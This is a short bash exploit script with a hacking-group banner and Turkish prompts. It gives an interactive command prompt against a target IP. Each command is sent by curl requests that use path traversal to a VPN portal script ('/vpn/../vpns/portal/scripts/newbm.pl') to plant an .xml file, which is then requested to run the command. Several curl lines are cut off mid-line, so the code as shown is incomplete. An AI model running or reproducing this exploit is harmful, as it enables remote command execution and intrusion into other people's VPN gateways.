#!/bin/bash
cat << "EOF"

    _    _  _____ _   _  ____ ___ _        _    ____
   / \  | |/ /_ _| \ | |/ ___|_ _| |      / \  |  _ \
  / _ \ | ' / | ||  \| | |    | || |     / _ \ | |_) |
 / ___ \| . \ | || |\  | |___ | || |___ / ___ \|  _ <
/_/   \_\_|\_\___|_| \_|\____|___|_____/_/   \_\_| \_\

EOF

if [ -z "$1" ]; then
echo -ne "Kullanimi : $0 ipadresi\n"
exit;
fi
while true; do
read -p "CMD~> " s
if [ "$s" != "" ]; then
if [ "$s" == "cik" ]; then
break;
else
dosyaadi=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | h>
curl -s -k "https://$1/vpn/../vpns/portal/scripts/newbm.pl" -d "u>
curl -m 3 -k "https://$1/vpn/../vpns/portal/$dosyaadi.xml" -H "NS>
curl -m 3 -k "https://$1/vpn/../vpns/portal/$dosyaadi.xml" -H "NS>
fi
fi
done